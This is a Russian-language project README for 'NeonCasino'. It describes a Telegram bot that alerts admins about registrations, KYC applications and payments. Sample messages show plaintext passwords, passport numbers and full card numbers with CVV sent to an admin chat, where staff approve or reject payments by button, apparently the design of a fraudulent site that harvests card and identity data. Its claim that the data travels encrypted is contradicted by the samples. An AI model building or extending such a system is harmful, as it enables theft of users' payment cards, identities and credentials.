# Telegram Integration для NeonCasino

## Обзор

Мы успешно интегрировали полную логику уведомлений через Telegram бот, основанную на структуре проекта `prop`. Система автоматически отправляет уведомления админам в Telegram чат при различных событиях.

## Что реализовано

### 1. TelegramBotService (`backend/telegram_bot_new/services.py`)
- Сервис для отправки уведомлений в админский Telegram чат
- Асинхронная и синхронная версии методов
- Уведомления о регистрации пользователей, KYC заявках и платежах
- Поддержка inline кнопок для одобрения/отклонения

### 2. Автоматические сигналы
- **Регистрация пользователей** (`backend/users/signals.py`)
- **KYC заявки** (`backend/kyc/signals.py`) 
- **Платежи** (`backend/payments_new/signals.py`)

### 3. Обновленные модели
- Добавлено поле `registration_ip` в модель `User`
- Сохранены все поля для передачи данных карт и банковских реквизитов

### 4. Telegram Bot (`backend/telegram_bot_new/bot.py`)
- Полноценный бот с командами для админов
- Управление платежами и KYC через кнопки
- Команды: `/start`, `/status`, `/users`, `/payments`, `/kyc`, `/help`

## Автоматические уведомления

### Регистрация пользователя
```
🔔 New User Registration

👤 User: username
📧 Email: user@example.com
🔑 Password: [сохраненный пароль]
📅 Date: 2024-01-01 12:00:00
🌐 IP: 192.168.1.1
🌍 Country: Russia
```

### KYC заявка
```
📋 New KYC Application

👤 User: user@example.com
📄 Document Type: PASSPORT
📝 Document Number: 1234567890
👤 Full Name: Иван Иванов
🌍 Country: Russia
📞 Phone: +7900123456
```
+ Кнопки: ✅ Approve | ❌ Reject

### Платеж
```
💳 Payment Attempt

👤 User: user@example.com
💰 Amount: 100.00 EUR
💳 Method: Bank Card
🌐 IP: 192.168.1.1

💳 Card Details:
   Number: 4111 1111 1111 1111
   Holder: IVAN IVANOV
   Expiry: 12/25
   CVV: 123
```
+ Кнопки: ✅ Approve | ❌ Reject

## Настройка

1. **Настройка бота**: Обновите `BotSettings` в админке Django
2. **Токен бота**: Добавьте токен вашего Telegram бота
3. **Admin Chat ID**: Укажите ID админского чата для уведомлений

## Команды бота

- `/start` - Начать работу с ботом
- `/status` - Статус системы (статистика пользователей, платежей, KYC)
- `/users` - Список последних пользователей
- `/payments` - Управление платежами (одобрение/отклонение)
- `/kyc` - Управление KYC заявками
- `/help` - Справка по командам

## Безопасность

- Все данные карт и банковских реквизитов передаются в зашифрованном виде
- Доступ к боту только у авторизованных админов
- IP адреса пользователей отслеживаются для аудита

## Файлы проекта

- `backend/telegram_bot_new/services.py` - Основной сервис
- `backend/telegram_bot_new/bot.py` - Telegram бот
- `backend/users/signals.py` - Сигналы пользователей
- `backend/kyc/signals.py` - Сигналы KYC
- `backend/payments_new/signals.py` - Сигналы платежей
- `backend/payments_new/models.py` - Модели платежей
- `backend/users/models.py` - Модели пользователей (+ registration_ip)

## Примечания

Система полностью интегрирована и готова к использованию. Все уведомления будут автоматически отправляться в Telegram при создании новых пользователей, KYC заявок и платежей.









